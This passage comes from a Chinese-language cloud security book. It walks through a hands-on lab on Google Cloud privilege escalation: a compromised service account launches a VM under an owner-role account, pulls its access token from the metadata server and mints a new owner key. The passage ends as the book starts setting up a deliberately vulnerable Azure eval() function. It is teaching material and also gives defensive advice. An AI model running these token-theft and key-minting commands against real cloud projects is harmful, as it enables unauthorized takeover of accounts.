  ```\n\n13. 将以 `superadmin` 开头的服务账号的电子邮件地址存储在 `SUPERADMIN_EMAIL` 变量中：\n\n```bash\n\
  SUPERADMIN_EMAIL=\"$SA_EMAIL\"\n```\n\n14. 使用访问令牌生成新的服务账号密钥：\n\n```bash\ncd ~\n\n\
  BASE_URL=\"https://iam.googleapis.com/v1\"\nPROJECT_PATH=\"projects/$PROJECT_ID\"\
  \nSERVICE_ACCOUNT=\"serviceAccounts/$SUPERADMIN_EMAIL\"\n\ncurl -s -X POST \\\n\
  \  -H \"Authorization: Bearer $SUPERADMIN_ACCESS_TOKEN\" \\\n  -H \"Content-Type:\
  \ application/json\" \\\n  \"$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys\" \\\n\
  \  -d '{}' \\\n  | jq -r '.privateKeyData' | base64 --decode > superadmin-key.json\n\
  ```\n\n你可以通过运行 `cat superadmin-key.json` 来验证 `superadmin-key.json` 是否存在。\n\n15.\
  \ 使用生成的密钥以具有 `roles/owner` 角色的服务账号身份进行身份验证：\n\n```bash\nexport SUPERADMIN_CREDENTIALS=\"\
  superadmin-key.json\"\ngcloud auth activate-service-account \\\n  --key-file=$SUPERADMIN_CREDENTIALS\n\
  \nPROJECT_ID=$(cat superadmin-key.json | jq -r \".project_id\")\ngcloud config set\
  \ project $PROJECT_ID\n```\n\n这会给出以下输出：\n\n```\nActivated service account credentials\
  \ for:\n [superadmin@....iam.gserviceaccount.com]\n\nUpdated property [core/project].\n\
  ```\n\n#### Note\n\n权限提升并不总是能让攻击者获得完全的 owner 级别访问权限。他们可以执行的操作仅限于被攻破的服务账号所分配的权限。\n\
  \n16. 运行以下命令列出所有已通过身份验证的 `gcloud` 账号：\n\n```bash\ngcloud auth list\n```\n\n这会产生以下输出：\n\
  \n```\nCredentialed Accounts\n\n...\n\nACTIVE:\nACCOUNT: html-to-pdf@....iam.gserviceaccount.com\n\
  \nACTIVE: *\nACCOUNT: superadmin@....iam.gserviceaccount.com\n\nTo set the active\
  \ account, run:\n    $ gcloud config set account `ACCOUNT`\n```\n\n在此，`superadmin@…​.iam.gserviceaccount.com`\
  \ 账号当前处于活动状态，如 `ACTIVE` 列中的 `*` 所示。\n\n17. 检查分配给服务账号的 IAM 角色，以验证其是否关联了 `roles/owner`\
  \ 角色：\n\n```bash\ngcloud projects get-iam-policy $PROJECT_ID \\\n  --flatten=\"\
  bindings[].members\" \\\n  --format='table(bindings.role)' \\\n  --filter=\"bindings.members:$SUPERADMIN_EMAIL\"\
  \n```\n\n这会产生以下响应：\n\n\n\n\n\n```\nROLE: roles/owner\n```\n\n到目前为止，你应该已经很好地理解了攻击者如何利用\
  \ Cloud Run 函数来 escalate 权限。虽然本节主要聚焦于通过 Cloud Run 函数进行权限提升，但部署新的 Cloud Run 服务并将其与具有提升\
  \ IAM 角色的服务账号关联，也能实现类似的结果。\n\n如 Figure 10-4 所示，从被攻破的 `html-to-pdf@…​.iam​.gser⁠viceaccount.com`\
  \ 服务账号开始，攻击者可以部署新的 Cloud Run 服务并将其与 `superadmin@…​.iam.gserviceaccount.com` 服务账号关联。通过此新的\
  \ Cloud Run 服务，攻击者可以通过向服务端点发送授权请求来获取关联服务账号的访问令牌，并使用该访问令牌以服务账号身份进行身份验证（`superadmin@…​.iam.gserviceaccount.com`）。一旦以具有提升权限的服务账号身份通过身份验证（`superadmin@…​.iam.gserviceaccount.com`），攻击者就有效地获得了执行其分配的\
  \ IAM 角色所允许的任何操作的能力。\n\n![](img/lsse_1004.png)\n\n从防御安全角度来看，定期审查具有提升权限的服务账号并将其使用限制在特定资源上以降低权限提升风险非常重要。此外，你应定期删除或清理未使用的资源，以限制攻击者可能用来提升权限的途径。\n\
  \n### 通过 Compute Engine VM 实例提升权限\n\n在本节中，你将深入了解攻击者如何通过启动新的 Compute Engine VM 实例并将其与具有提升权限的现有服务账号关联来提升权限。你会发现，一旦具有过度宽松服务账号的\
  \ VM 正在运行，攻击者就可以轻松通过 SSH 连接并获取关联服务账号的访问令牌。凭借此访问令牌，攻击者随后可以以该服务账号身份进行身份验证并执行其 IAM\
  \ 角色允许的任何操作。\n\n#### Note\n\n本节假设你使用 Attacker 账号来模拟攻击者与 Serverless Lab 账号中 serverless\
  \ 实验室环境的资源进行交互。\n\n让我们继续进行权限提升模拟：\n\n1. 导航到 Cloud Shell 环境的主目录，然后显示 `run-key.json`\
  \ 文件的内容：\n\n```\ncd ~\n\ncat run-key.json\n```\n\n这会产生以下输出：\n\n```\n{\n  \"type\"\
  : \"service_account\",\n  \"project_id\": \"...\",\n  \"private_key_id\": \"...\"\
  ,\n  \"private_key\": \"...\",\n  \"client_email\": \"html-to-pdf@....iam.gserviceaccount.com\"\
  ,\n  \"client_id\": \"...\",\n  \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\"\
  ,\n  \"token_uri\": \"https://oauth2.googleapis.com/token\",\n  \"auth_provider_x509_cert_url\"\
  : \"https://www.googleapis.com/...\",\n  \"client_x509_cert_url\": \"https://www.googleapis.com/...\"\
  ,\n  \"universe_domain\": \"googleapis.com\"\n}\n```\n\n2. 使用 `run-key.json` 文件以被攻破的\
  \ Cloud Run 服务使用的服务账号身份进行身份验证：\n\n```\nexport RUN_SA_CREDENTIALS=\"run-key.json\"\
  \ngcloud auth activate-service-account \\\n  --key-file=$RUN_SA_CREDENTIALS\n```\n\
  \n你应该会收到以下确认消息：\n\n```\nActivated service account credentials for:\n [html-to-pdf@....iam.gserviceaccount.com]\n\
  ```\n\n3. 通过从密钥文件检索项目 ID 来设置当前 `gcloud` 项目：\n\n```\nPROJECT_ID=$(cat run-key.json\
  \ | jq -r \".project_id\")\ngcloud config set project $PROJECT_ID\n```\n\n4. 从密钥文件检索服务账号的电子邮件地址并将其存储在\
  \ `RUN_KEY_EMAIL` 变量中：\n\n```\nRUN_KEY_EMAIL=$(cat run-key.json | jq -r \".client_email\"\
  )\necho $RUN_KEY_EMAIL\n```\n\n你应该会得到以下输出：\n\n```\nhtml-to-pdf@....iam.gserviceaccount.com\n\
  ```\n\n5. 检查分配给服务账号的 IAM 角色以验证其权限：\n\n```\ngcloud projects get-iam-policy $PROJECT_ID\
  \ \\\n  --flatten=\"bindings[].members\" \\\n  --format='table(bindings.role)' \\\
  \n  --filter=\"bindings.members:$RUN_KEY_EMAIL\"\n```\n\n这会输出以下内容：\n\n```\nROLE:\
  \ roles/editor\n\nROLE: roles/iam.serviceAccountUser\n\nROLE: roles/run.admin\n\
  ```\n\n#### Caution\n\n尽管没有直接冒充其他服务账号的能力，但 `roles/run.admin` 和 `roles/iam.serviceAccountUser`\
  \ 角色的组合可以被攻击者利用来启动新的 Cloud Run 函数并将其与具有提升权限的现有服务账号关联。\n\n6. 列出当前 Google Cloud 项目中的所有服务账号：\n\
  \n```\ngcloud iam service-accounts list\n```\n\n这会给你一个服务账号列表——包括一个电子邮件地址以 `superadmin`\
  \ 开头的服务账号：\n\n```\n...\n\nDISPLAY NAME: Cloud Run HTML to PDF Service Account\n\
  EMAIL: html-to-pdf@....iam.gserviceaccount.com\nDISABLED: False\n\nDISPLAY NAME:\
  \ superadmin\nEMAIL: superadmin@....iam.gserviceaccount.com\nDISABLED: False\n```\n\
  \n7. 复制以 `superadmin` 开头的服务账号的电子邮件地址并将其存储在 `SA_EMAIL` 变量中：\n\n```\nSA_EMAIL=\"[EMAIL]\"\
  \n```\n\n8. 检查电子邮件地址以 `superadmin` 开头的服务账号分配的 IAM 角色：\n\n```\ngcloud projects get-iam-policy\
  \ $PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --format='table(bindings.role)'\
  \ \\\n  --filter=\"bindings.members:$SA_EMAIL\"\n```\n\n这会返回以下响应：\n\n```\nROLE:\
  \ roles/owner\n```\n\n现在你已经确定了用于提升权限的服务账号，让我们继续启动新的 Compute VM 实例：\n\n1. 启动一个 Compute\
  \ Engine VM（命名为 `token-vm`），使用配置了 `roles/owner` 角色的服务账号：\n\n```\ngcloud compute\
  \ instances create token-vm \\\n  --zone=us-east1-b \\\n  --machine-type=e2-micro\
  \ \\\n  --image-family=debian-12 \\\n  --image-project=debian-cloud \\\n  --service-account=$SA_EMAIL\
  \ \\\n  --scopes=https://www.googleapis.com/auth/cloud-platform\n```\n\n这会产生以下输出：\n\
  \n```\nCreated [...].\nNAME: token-vm\nZONE: us-east1-b\nMACHINE_TYPE: e2-micro\n\
  PREEMPTIBLE:\nINTERNAL_IP: ...\nEXTERNAL_IP: ...\nSTATUS: RUNNING\n```\n\n#### Note\n\
  \n此 VM 实例将在 Serverless Lab 账号中启动（来自 Attacker 账号的 Cloud Shell 终端）。\n\n2. 使用 SSH 连接到\
  \ `us-east1-b` 区域中的 `token-vm` Compute Engine 实例：\n\n```\ngcloud compute ssh token-vm\
  \ --zone=us-east1-b\n```\n\n3. 通过 SSH 连接到 VM 时，检查 VM 的操作系统和内核版本：\n\n```\nuname -a\n\
  ```\n\n你应该会得到以下输出：\n\n```\nLinux token-vm 6.1.0-37-cloud-amd64 #1 SMP PREEMPT_DYNAMIC\n\
  Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux\n```\n\n检索为 VM 配置的服务账号的电子邮件地址：\n\n\
  ```\nMD_URL=\"http://169.254.169.254/computeMetadata/v1\"\n\nSERVICE_ACCOUNT_EMAIL=$(curl\
  \ -s -H \"Metadata-Flavor: Google\" \\\n    \"$MD_URL/instance/service-accounts/default/email\"\
  )\n\necho $SERVICE_ACCOUNT_EMAIL\n```\n\n输出应确认 VM 配置为使用具有 `roles/owner` 角色的服务账号：\n\
  \n```\nsuperadmin@....iam.gserviceaccount.com\n```\n\n#### Tip\n\n请注意此服务账号电子邮件，因为你将在后面的步骤中需要它。\n\
  \n检索授予 VM 默认服务账号的 OAuth 2.0 范围：\n\n\n\n```\ncurl -H \"Metadata-Flavor: Google\"\
  \ \\\n  \"$MD_URL/instance/service-accounts/default/scopes\"\n```\n\n这将返回以下输出：\n\
  \n```\nhttps://www.googleapis.com/auth/cloud-platform\n```\n\n从实例元数据服务器检索 VM 默认服务账号的访问令牌：\n\
  \n```\ncurl -H \"Metadata-Flavor: Google\" \\\n  \"$MD_URL/instance/service-accounts/default/token\"\
  \n```\n\n你应得到以下 JSON 响应：\n\n```\n{\"access_token\":\"...\",\"expires_in\":...,\"\
  token_type\":\"Bearer\"}\n```\n\n从上一步的 JSON 输出中复制 `access_token` 的值。\n\n退出 SSH 会话：\n\
  \n```\nexit\n```\n\n##### 4. 将访问令牌的值存储在变量中：\n\n```\nSUPERADMIN_ACCESS_TOKEN=\"[ACCESS\
  \ TOKEN]\"\n```\n\n确保将 `[ACCESS TOKEN]` 替换为访问令牌。\n\n##### 5. 将服务账号的电子邮件地址（`superadmin@....iam.gserviceaccount.com`）存储在变量中：\n\
  \n```\nSUPERADMIN_EMAIL=\"[EMAIL]\"\n```\n\n确保将 `[EMAIL]` 替换为以 `superadmin` 开头的服务账号的电子邮件地址。\n\
  \n##### 6. 生成新的服务账号密钥然后将其保存到本地：\n\n```\ncd ~\n\nBASE_URL=\"https://iam.googleapis.com/v1\"\
  \nPROJECT_PATH=\"projects/$PROJECT_ID\"\nSERVICE_ACCOUNT=\"serviceAccounts/$SUPERADMIN_EMAIL\"\
  \n\ncurl -s -X POST \\\n  -H \"Authorization: Bearer $SUPERADMIN_ACCESS_TOKEN\"\
  \ \\\n  -H \"Content-Type: application/json\" \\\n  \"$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys\"\
  \ \\\n  -d '{}' \\\n  | jq -r '.privateKeyData' | base64 --decode > superadmin-key-02.json\n\
  ```\n\n#### Tip\n\n你可以通过运行 `cat superadmin-key-02.json` 来验证 `superadmin-key-02.json`\
  \ 是否存在。\n\n##### 7. 使用生成的密钥以关联 `roles/owner` 角色的服务账号身份进行身份验证：\n\n```\nexport SUPERADMIN_CREDENTIALS=\"\
  superadmin-key-02.json\"\n\ngcloud auth activate-service-account \\\n  --key-file=$SUPERADMIN_CREDENTIALS\n\
  \nPROJECT_ID=$(cat superadmin-key-02.json | jq -r \".project_id\")\ngcloud config\
  \ set project $PROJECT_ID\n```\n\n##### 8. 列出所有已通过身份验证的 `gcloud` 账号：\n\n```\ngcloud\
  \ auth list\n```\n\n这会产生以下输出：\n\n```\nCredentialed Accounts\n\n...\n\nACTIVE:\n\
  ACCOUNT: html-to-pdf@....iam.gserviceaccount.com\n\nACTIVE: *\nACCOUNT: superadmin@....iam.gserviceaccount.com\n\
  \nTo set the active account, run:\n    $ gcloud config set account `ACCOUNT`\n```\n\
  \n这里，`superadmin@…​.iam.gserviceaccount.com` 账号当前处于活动状态，如 ACTIVE 列中的 `*` 所示。\n\n\
  ##### 9. 检查分配给服务账号的 IAM 角色，以验证其是否关联 `roles/owner` 角色：\n\n```\ngcloud projects get-iam-policy\
  \ $PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n  --format='table(bindings.role)'\
  \ \\\n  --filter=\"bindings.members:$SUPERADMIN_EMAIL\"\n```\n\n这会输出以下内容：\n\n```\n\
  ROLE: roles/owner\n```\n\n你现在应该对过度宽松的服务账号如何允许攻击者将权限提升超出其初始访问范围有了很好的了解。从这一点开始，攻击者可以对项目执行不受限制的操作，包括修改\
  \ IAM 策略、创建或删除资源、部署恶意工作负载、访问敏感数据，以及安装后门以在账号中保持长期持久性。\n\n攻击者可以采取的另一条途径是创建新的 API 密钥——一个加密字符串，允许应用程序调用各种\
  \ Google Cloud API，例如 Cloud Translation API 和 Cloud Vision API——并使用它直接访问无服务器实验环境中启用的\
  \ Google Cloud 服务，如 Figure 10-5 所示。\n\n![](img/lsse_1005.png)\n\n成功生成或获取 API 密钥的攻击者可以直接在\
  \ rogue 项目中使用它进行未经授权的请求并与 Google Cloud 服务交互，而无需使用被入侵服务账号的凭据。要生成新的 API 密钥，攻击者可以以具有相关\
  \ `apikeys.keys.*` 权限的服务账号身份进行身份验证，例如由 `roles/​serv⁠iceusage.apiKey⁠s​Admin` 角色授予的权限。^17\
  \ 由于 `superadmin@…​.iam.gserviceaccount.com` 服务账号已被授予 `roles/owner` 角色（该角色已包含 `apikeys.keys.*`\
  \ 权限），攻击者可以在无需额外权限的情况下创建和管理 API 密钥。\n\n从防御安全角度来看，主动检查具有提升权限的服务账号并将其使用限制为仅特定资源以限制攻击者通过服务账号提升权限的能力至关重要。你还必须主动审计每个项目中现有的\
  \ API 密钥，验证其权限，并撤销任何可疑或可能被入侵的密钥。^18 你应考虑使用自动化工具和服务来持续监控配置错误、检测未经授权的 API 密钥使用情况，并在所有服务账号和项目中强制执行最小权限访问。\n\
  \n#### Caution\n\n现在你已完成本章和前两章中的动手示例，请务必检查并删除你在 Google Cloud 账号中创建的所有资源。留下不再使用的资源可能会导致不必要的费用，并使你的账号暴露于潜在的安全风险。\n\
  \n## Summary\n\n在本章中，你深入了解了攻击者如何利用其初始访问权限设置后门、提升权限并入侵云账号中的其他资源。你首先通过设置较低的请求超时来限制攻击者在反向\
  \ shell 会话中运行恶意命令的时间窗口——但很快意识到仅此措施无法完全保护应用程序免受知道如何绕过此类限制的攻击者侵害。在完成包括设置后门在内的攻击模拟后，你进一步将易受攻击的\
  \ Cloud Run 服务的请求超时设置减少到 10 秒，并大幅减少了相关服务账号的权限。在无服务器实验环境中实施这些更改后，你模拟了攻击者如何通过避免使用反向\
  \ shell 来绕过新的超时和权限限制。最后，你探索了攻击者可以用来滥用配置错误并在 Google Cloud 账号中提升权限的多种策略和方法。\n\n在下一章中，你将把重点转向\
  \ Microsoft Azure，并研究攻击者如何利用易受攻击的 Azure Functions。随着你进行模拟和动手示例，你将学习如何识别各种类型的配置错误并对其进行保护以抵御潜在威胁。\n\
  \n^1 你可以 optionally 将输出粘贴到本地文本编辑器中。\n\n^2 你可以在 [GitHub gist (see `remove_iam_policy_binding.sh`)](https://oreil.ly/0mSPU)\
  \ 中找到此脚本。请注意，你可能需要浏览页面才能找到它。\n\n^3 这假设 `ngrok` 已在你的本地机器上安装并完全配置（例如，你的 `ngrok` authtoken\
  \ 已设置，并且你有权限打开隧道）。如果没有，请在运行隧道之前按照官方 `ngrok` 设置说明进行操作。\n\n^4 如果 `INPUT_BUCKET` 变量已设置，可以跳过此步骤。\n\
  \n^5 如果 `NGROK_URL` 变量已设置，可以跳过此步骤。\n\n^6 由于你的 `ngrok` URL 不同，预计会得到不同的编码字符串输出。\n\n\
  \n\n\n\n^(7) 如果你遇到 `ServiceException` 或权限错误，运行 `gcloud auth login` 并按照步骤重新进行身份验证。身份验证完成后，请确保重新运行命令以完成上传。\n\
  \n^(8) 运行 `ls -l` 以确认指定名称的文件存在于当前目录中。\n\n^(9) 在我最近一次运行动手示例时，生成的文件名达到了 311 字节。\n\n\
  ^(10) 此端点可通过 http://169.254.169.254/ 访问，并且可供在 Compute Engine、Cloud Run 以及其他可访问元数据服务器的\
  \ Google Cloud 管理资源上运行的应用程序和工作负载使用。\n\n^(11) 如果 `INPUT_BUCKET` 变量已设置，可以跳过此步骤。\n\n\
  ^(12) 如果在上传文件时遇到权限错误，请运行 `gcloud auth login` 并按照步骤重新进行身份验证。\n\n^(13) 即使由于 Cloud\
  \ Resource Manager API 未为项目启用而收到 `PERMISSION_DENIED` 错误，你仍应能够从响应中获取项目编号。\n\n^(14)\
  \ 使用项目 ID 而不是项目编号也应该可以正常工作。\n\n^(15) 电子邮件地址应以 `html-to-pdf` 开头。\n\n^(16) 每个服务帐户对可拥有的活动密钥数量都有最大限制。达到此限制后尝试创建新密钥将导致\
  \ `FAILED_PRECONDITION` 错误。\n\n^(17) 请参阅 [Google Cloud 文档](https://oreil.ly/c-_6B)\
  \ 了解更多详情。\n\n^(18) 你可以通过导航到 Google Cloud 控制台中的凭据页面，查看 API 密钥列表，并根据需要更新或删除密钥来完成此操作。\n"
- "## 第 11 章. Hacking and Securing Azure Functions\n\n在过去的几章中，你探索了攻击者如何利用 AWS 和 Google\
  \ Cloud 上运行的无服务器应用程序中的漏洞和错误配置。你检查了未应用最小权限原则的后果，并亲身体验了过于宽泛的权限如何使攻击者能够提升权限、窃取敏感数据、设置后门并破坏整个云帐户。通过模拟真实世界的攻击和防御场景，你学习了如何识别错误配置、评估防御措施并应用各种策略来保护在\
  \ AWS 和 Google Cloud 上运行的无服务器应用程序。\n\n在本章中，你将把重点转移到 Microsoft Azure，并探索攻击者如何滥用云平台上运行的无服务器应用程序中的错误配置和漏洞。如同前几章一样，你将准备一个有意设计为易受攻击的无服务器应用程序，使用不安全的默认设置和错误配置进行配置，以便你可以安全地模拟攻击者利用各种漏洞和安全问题。你将首先设置一个易受攻击的\
  \ Azure 函数，然后继续模拟攻击者利用该函数中的代码注入漏洞。为了加快安全测试模拟的速度，你将准备并使用一个自定义脚本，该脚本可自动化向易受攻击函数的调用端点发送自定义恶意负载、捕获并返回函数的响应，并允许你通过读取-求值-打印循环（REPL）进行交互式迭代，如\
  \ Figure 11-1 所示。\n\n![](img/lsse_1101.png)\n\n你还将把密钥存储在 Azure Key Vault 中，并探索代码注入漏洞与过于宽松的管理身份结合时，攻击者如何利用其窃取这些密钥。你会看到，虽然使用\
  \ Azure Key Vault 等密钥管理器服务被认为是一种最佳实践，但它并非万无一失，因为配置不当的身份或过于宽泛的权限仍可能允许攻击者窃取保存在保管库中的凭据和其他敏感密钥。\n\
  \n本章将涵盖以下内容：\n\n* “Setting Up and Deploying a Vulnerable-by-Design Serverless Function”\n\
  * “Exploiting the Vulnerable Serverless Function”\n* “Storing Secrets in Azure Key\
  \ Vault”\n* “Abusing an Overly Permissive Managed Identity to Exfiltrate Key Vault\
  \ Secrets”\n\n到本章结束时，你将更好地具备识别 Azure 上无服务器应用程序中的错误配置和漏洞的能力，重现攻击者如何利用它们，并开发自定义脚本和工具来加速和自动化安全测试和验证。\n\
  \n### Reviewing Technical Prerequisites\n\n对于本章，你将使用两个 Azure 帐户：Serverless Lab 帐户用于托管易受攻击的按设计实验室环境，以及\
  \ Attacker 帐户用于模拟攻击和测试安全控制。强烈建议使用全新的帐户且没有任何现有资源，以最大程度地减少安全相关副作用并确保实验室环境按预期运行。保持两个帐户在单独的浏览器会话（或隐身/隐私窗口）中打开，以避免会话冲突。\n\
  \n#### Note\n\n为了帮助你完成练习和模拟，本章中使用的代码和命令的副本可在 [GitHub gist (see `ch11.md`)](https://oreil.ly/0mSPU)\
  \ 中获得。\n\n### Setting Up and Deploying a Vulnerable-by-Design Serverless Function\n\
  \n在 Chapter 2 中，你探索了实现无服务器运营模式的各种实现模式、架构和云服务。你了解到，一旦你理解了无服务器设计的 fundamentals，你就可以轻松地将这些概念映射到\
  \ Azure 等云平台。例如，如果你在 Azure 上构建无服务器 Web 应用程序或 API，你将使用 Azure Functions 处理计算任务，使用\
  \ Azure Blob Storage 存储应用程序数据和资产，并使用 Azure API Management、Event Grid 和 Service Bus\
  \ 等支持服务来管理集成和事件驱动的工作流。此外，你还将使用 Azure Key Vault 安全地存储和管理密钥、凭据和其他敏感配置值。虽然这些服务处理了大部分运营复杂性，但正确保护它们仍然是你的责任，因为错误配置可能导致数据泄露、未经授权的访问或无服务器应用程序的完全入侵。同时，了解攻击者如何发现和利用这些错误配置对于确保你的无服务器应用程序免受真实世界威胁的攻击至关重要。\n\
  \n在本节中，你将主要关注 Azure Functions，并设置一个易受攻击的按设计无服务器函数，以便你探索攻击者如何发现和利用代码注入等漏洞来破坏函数并窃取源代码、硬编码密钥和环境变量。为了简化本章的模拟，我们不会实现前端界面，而是完全专注于无服务器函数，如\
  \ Figure 11-2 所示。\n\n![](img/lsse_1102.png)\n\n\n\n\n\n更具体地说，你将设置一个有意设计为易受攻击的无服务器函数，使用\
  \ Node.js 并通过 `eval()` 来计算数学表达式，例如 `(5 - 4) * 23`。你将首先使用内置的 HTTP 触发器模板部署一个函数应用。然后，你将在此初始设置的基础上进行构建，通过修改函数代码并将其替换为容易受到代码注入攻击的自定义实现。为了确保只有你能够调用和测试该无服务器函数，它将被配置为需要有效的函数密钥。这将在你进行动手示例时帮助保护你的函数以及整体\
  \ Azure 账户。\n\n在你深入动手部分之前，让我们先定义本章工作中相关的几个关键术语：\n\n##### Azure Cloud Shell\n\n一个托管在云中的基于浏览器的\
  \ shell 环境，预配置了代码编辑器和常用的 CLI 工具。如果你使用过 AWS CloudShell 或 Google Cloud Shell，你会发现\
  \ Azure Cloud Shell 体验很熟悉，因为它提供了一个类似的基于浏览器的环境。\n\n##### 资源组\n\n一个逻辑容器，用于将相关的 Azure\
  \ 资源分组，以便你可以一起管理、更新和删除它们。例如，如果你有一个 Azure 函数、其关联的存储账户和一个 Key Vault，你可以将它们全部放在一个资源组中以便一起管理、更新或删除。\n\
  \n##### 存储账户\n\n为诸如 blob、文件、队列、表和磁盘等数据对象提供安全、持久且高度可用的云存储。\n\n##### Azure Functions\n\
  \n一种无服务器计算服务，根据 HTTP 请求、计时器、blob 上传或队列消息等触发器运行事件驱动的代码。如果你使用过 AWS Lambda 或 Google\
  \ Cloud Run 函数，你会发现 Azure Functions 遵循相同的事件驱动模型，会在触发时自动运行你的代码，而无需管理服务器。\n\n#####\
  \ 函数应用\n\n一个或多个 Azure 函数的托管容器。它定义了运行时堆栈、托管计划、应用设置和管理身份。函数应用为你的函数提供执行环境，包括缩放行为、网络和身份验证配置。\n\
  \n##### 函数密钥\n\n用于对 Azure 函数的请求进行身份验证和授权的秘密令牌。它确保只有拥有正确密钥的客户端才能调用该函数。\n\n##### Azure\
  \ 命令行界面 (CLI)\n\n一个跨平台命令行实用程序，让你可以直接从终端通过简单、可脚本化的命令创建、配置和管理 Azure 资源。^1 例如，如果你想创建一个新的资源组，你可以运行\
  \ `az group create --name $RESOURCE_GROUP --location $LOCATION` 来在特定的 Azure 区域中进行配置。\n\
  \n这些 Azure 服务、组件和工具充当了前几章中 AWS 和 Google Cloud 的对应物。就像你使用 AWS Lambda 函数、IAM 角色和 S3\
  \ 存储桶或 Google Cloud Run 服务、IAM 角色和权限以及 Cloud Storage 存储桶一样，Azure 提供了创建、保护和管理无服务器应用程序的类似构建块。虽然这些对应物可能并不完全相同，但理解它们的功能和关系将帮助你在多个云平台上应用一致的安全实践和运营策略。\n\
  \n本节中你将部署的易受攻击的函数使用了硬编码的凭据和环境变量，将敏感的访问密钥暴露给第三方服务。如果攻击者能够利用函数中的代码注入漏洞，他们可能会窃取这些凭据并使用它们来获得对数据库、存储桶和\
  \ API 的未经授权的访问。\n\n#### Note\n\n本节假设你正在使用你的 Serverless Lab 账户，该账户将托管易受攻击的无服务器实验室资源。一旦你完成了本章和接下来的两章中的动手示例，请务必查看并删除你在\
  \ Azure 账户中创建的所有资源，以避免不必要的费用并降低潜在的安全风险。\n\n让我们逐步介绍设置和部署你的易受攻击的无服务器函数：\n\n1. 在浏览器标签页中打开\
  \ [*https://portal.azure.com*](https://portal.azure.com) 并使用你的 Serverless Lab 账户登录。\n\
  \n2. 通过点击 Azure 门户顶部导航栏中的 `>_` 图标启动 Azure Cloud Shell。\n\n   #### Note\n\n   首次启动时，你将经历\
  \ Cloud Shell 的初始设置过程。系统提示选择 Bash 或 PowerShell 时，选择 Bash 作为你的 shell 环境。然后，为确保文件在会话之间得以保留，选择“Mount\
  \ storage account”，选择相应的存储账户订阅，然后从挂载存储账户的选项列表中选择“We will create a storage account\
  \ for you”。\n\n3. 在 Cloud Shell 终端中运行以下命令（在 `$` 符号之后）以创建函数项目的目录并导航到该新目录：\n\n   ```\n\
  \   mkdir -p vulnerable-function\n   cd vulnerable-function\n   ```\n\n4. 将 `RANDOM`\
  \ 内置 shell 变量中存储的随机数复制到一个单独的环境变量（`$RAND`）：^2\n\n   ```\n   RAND=$RANDOM\n   \n \
  \  echo $RAND\n   ```\n\n   请记下此值，因为它将在本章中用于生成 Azure 资源的唯一名称。\n\n5. 定义你在设置易受攻击的无服务器函数时将使用的环境变量：\n\
  \n   ```\n   RESOURCE_GROUP=rg-serverless-security-lab\n   STORAGE_ACCOUNT=storageaccount$RAND\n\
  \   FUNCTION_APP=functionapp$RAND\n   LOCATION=eastus\n   ```\n\n6. 将你在上一步中定义变量保存到名为\
  \ `function-vars.sh` 的 shell 脚本文件中：\n\n   ```\n   cat <<EOF > function-vars.sh\n\
  \   export RESOURCE_GROUP=\"$RESOURCE_GROUP\"\n   export STORAGE_ACCOUNT=\"$STORAGE_ACCOUNT\"\
  \n   export FUNCTION_APP=\"$FUNCTION_APP\"\n   export LOCATION=\"$LOCATION\"\n \
  \  EOF\n   ```\n\n   #### Tip\n\n   如果你开始了一个新的 shell 会话或丢失了当前 shell 状态，你可以通过运行 `source\
  \ function-vars.sh` 重新加载环境变量。\n\n7. 创建一个新的资源组，用于组织和分组你的无服务器应用程序的资源：\n\n   ```\n\
  \   az group create --name $RESOURCE_GROUP --location $LOCATION\n   ```\n\n   这会产生以下输出：\n\
  \n   ```\n   {\n     \"id\": \"/subscriptions/.../resourceGroups/rg-serverless-security-lab\"\
  ,\n     \"location\": \"eastus\",\n     \"managedBy\": null,\n     \"name\": \"\
  rg-serverless-security-lab\",\n     \"properties\": {\n       \"provisioningState\"\
  : \"Succeeded\"\n     },\n     \"tags\": null,\n     \"type\": \"Microsoft.Resources/resourceGroups\"\
  \n   }\n   ```\n\n8. 接下来，创建一个将由你的函数应用使用的存储账户：^3\n\n   ```\n   az storage account\
  \ create \\\n     --name $STORAGE_ACCOUNT \\\n     --location $LOCATION \\\n   \
  \  --resource-group $RESOURCE_GROUP \\\n     --sku Standard_LRS\n   ```\n\n   经过几秒钟后，这应该会产生以下输出：\n\
  \n   ```\n   {\n     \"accessTier\": \"Hot\",\n     \"accountMigrationInProgress\"\
  : null,\n     \"allowBlobPublicAccess\": false,\n   \n     ...\n   \n     \"sku\"\
  : {\n       \"name\": \"Standard_LRS\",\n       \"tier\": \"Standard\"\n     },\n\
  \     \"statusOfPrimary\": \"available\",\n     \"statusOfSecondary\": null,\n \
  \    \"storageAccountSkuConversionStatus\": null,\n     \"tags\": {},\n     \"type\"\
  : \"Microsoft.Storage/storageAccounts\"\n   }\n   ```\n\n9. 创建一个 Azure 函数应用来托管你的易受攻击的函数：^4\n\
  \n\n\n\n\n```\nRUNTIME_VERSION=22\n\naz functionapp create \\\n  --resource-group\
  \ $RESOURCE_GROUP \\\n  --consumption-plan-location $LOCATION \\\n  --runtime node\
  \ \\\n  --runtime-version $RUNTIME_VERSION \\\n  --functions-version 4 \\\n  --name\
  \ $FUNCTION_APP \\\n  --storage-account $STORAGE_ACCOUNT\n```\n\n请确保将 `RUNTIME_VERSION`\
  \ 设置为 Azure Functions 支持的 Node.js 版本。^(5)\n\n过一分钟左右，你应该会收到以下输出信息，表明你的函数应用已成功创建：\n\
  \n```\nApplication Insights \"functionapp...\" was created for this Function App.\
  \ You can visit https://portal.azure.com/#resource/subscriptions/.../resourceGroups/rg-serverless-security-lab/providers/microsoft.insights/components/functionapp.../overview\
  \ to view your Application Insights component\n```\n\n```\n{\n  \"availabilityState\"\
  : \"Normal\",\n  \"clientAffinityEnabled\": false,\n  \"clientCertEnabled\": false,\n\
  \  \"clientCertExclusionPaths\": null,\n  \"clientCertMode\": \"Required\",\n\n\
  \  ...\n\n  \"usageState\": \"Normal\",\n  \"virtualNetworkSubnetId\": null,\n \
  \ \"vnetContentShareEnabled\": false,\n  \"vnetImagePullEnabled\": false,\n  \"\
  vnetRouteAllEnabled\": false,\n  \"workloadProfileName\": null\n}\n```\n\n#####\
  \ 10. 使用 Node.js 作为运行时初始化一个新的 Azure Functions 项目：^(6)\n\n```\nfunc init --worker-runtime\
  \ node --language javascript\n```\n\n这会产生以下日志输出：\n\n```\nThe new Node.js programming\
